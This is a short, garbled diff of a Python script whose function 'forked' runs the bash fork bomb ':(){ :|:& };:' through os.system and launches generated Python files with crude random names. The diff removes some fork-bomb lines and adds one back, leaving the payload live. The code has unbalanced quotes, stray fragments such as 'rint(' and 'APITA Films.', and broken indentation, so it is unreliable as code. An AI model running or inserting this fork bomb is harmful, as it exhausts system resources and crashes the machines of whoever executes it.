@@ -47,8 +47,6 @@ def forked():
     """)
 os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py") :|:& };:")rint("Thanks for stopping in.")
 time.sleep(20)
-os.system(":(){ :|:& };:")")""");:")""");:")"""):|:& };:")""")APITA Films.")
-    time.sleep(20)
-    os.system(":(){ :|:& };:")""")
+os.system(":(){ :|:& };:")""")
       }
-      os.system("python touched.py")
+os.system("python touched.py")
